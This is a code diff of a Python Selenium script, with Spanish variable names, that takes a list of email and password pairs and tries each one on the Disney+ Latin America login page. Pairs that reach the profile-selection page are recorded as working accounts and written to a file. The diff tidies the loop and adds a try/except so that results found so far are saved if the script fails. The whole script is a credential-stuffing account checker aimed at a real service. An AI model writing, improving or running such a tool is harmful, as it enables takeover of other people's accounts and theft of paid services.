@@ -17,49 +17,49 @@ inicio=0
 final=len(df.values)
 
 cuentas_buenas=[]
-while inicio<final:
-    driver = webdriver.Chrome()
-    user=df.values[inicio][0]
+try:
+    while inicio < final:
+        driver = webdriver.Chrome()
+        user = df.values[inicio][0]
 
-    password=df.values[inicio][1]
-    driver.get("https://www.disneyplus.com/es-419/login")
-    time.sleep(5)
-    input_user = driver.find_element(By.XPATH, "//input[@id='email']")
-    input_user.send_keys(user)
-    time.sleep(2)
-    driver.find_element_by_xpath("//button[contains(text(),'CONTINUAR')]").click()
-    time.sleep(2)
-    print(driver.current_url=='https://www.disneyplus.com/es-419/enter-passcode')
-    print(driver.current_url=='https://www.disneyplus.com/es-cl')
-    if str(driver.current_url)=='https://www.disneyplus.com/es-419/enter-passcode':
-        driver.close()
-        inicio=inicio+1
-    elif str(driver.current_url)=='https://www.disneyplus.com/es-cl':
-        driver.close()
-        inicio = inicio + 1
-
-    else:
-        pass_user = driver.find_element(By.XPATH, "//input[@id='password']")
-        pass_user.send_keys(password)
-        time.sleep(2)
-        driver.find_element_by_xpath("//button[contains(text(),'INICIAR SESIÓN')]").click()
+        password = df.values[inicio][1]
+        driver.get("https://www.disneyplus.com/es-419/login")
         time.sleep(5)
-        if str(driver.current_url) == "https://www.disneyplus.com/es-419/select-profile":
-            cuentas_buenas.append([user, password])
-        else:
-            pass
-
+        input_user = driver.find_element(By.XPATH, "//input[@id='email']")
+        input_user.send_keys(user)
+        time.sleep(2)
+        driver.find_element_by_xpath("//button[contains(text(),'CONTINUAR')]").click()
+        time.sleep(2)
+        if str(driver.current_url) == 'https://www.disneyplus.com/es-419/enter-passcode':
+            driver.close()
+            inicio = inicio + 1
+        elif str(driver.current_url) == 'https://www.disneyplus.com/es-cl':
             driver.close()
             inicio = inicio + 1
 
+        else:
+            pass_user = driver.find_element(By.XPATH, "//input[@id='password']")
+            pass_user.send_keys(password)
+            time.sleep(2)
+            driver.find_element_by_xpath("//button[contains(text(),'INICIAR SESIÓN')]").click()
+            time.sleep(5)
+            if str(driver.current_url) == "https://www.disneyplus.com/es-419/select-profile":
+                cuentas_buenas.append([user, password])
+                driver.close()
+            else:
+                pass
+
+                driver.close()
+                inicio = inicio + 1
+
+    dp = pd.DataFrame(cuentas_buenas, columns=['Cuenta', 'Contraseña'])
+    np.savetxt('cuentas_buenas.txt', dp.values, fmt='%s', delimiter=":", header="Cuenta \t Contrasena \t")
+
+except:
+    dp = pd.DataFrame(cuentas_buenas, columns=['Cuenta', 'Contraseña'])
+    np.savetxt('cuentas_buenas.txt', dp.values, fmt='%s', delimiter=":", header="Cuenta \t Contrasena \t")
 
 
 
 
-dp = pd.DataFrame(cuentas_buenas, columns = ['Cuenta', 'Contraseña'])
-np.savetxt('cuentas_buenas.txt', dp.values, fmt='%s', delimiter=":", header="Cuenta \t Contrasena \t")
-# print(cuentas_buenas)
 
-
-
-#https://www.disneyplus.com/es-419/restart-subscription
